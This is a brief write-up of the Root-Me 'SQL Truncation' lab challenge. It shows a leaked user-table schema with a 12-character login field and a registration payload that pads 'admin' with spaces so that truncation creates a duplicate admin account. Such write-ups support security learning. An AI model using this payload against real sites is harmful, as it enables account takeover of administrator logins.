# SQL truncation

[root-me challenge: SQL Truncation](https://www.root-me.org/en/Challenges/Web-Server/SQL-Truncation): Gain access to the administration zone.

----

Trying to register as admin, in the response:

```text
<!--
CREATE TABLE IF NOT EXISTS user(   
	id INT NOT NULL AUTO_INCREMENT,
    login VARCHAR(12),
    password CHAR(32),
    PRIMARY KEY (id));
-->
```

Using [SQL Truncation Attack](https://linuxhint.com/sql-truncation-attack/):

```text
login=admin+++++++a&password=admin123
```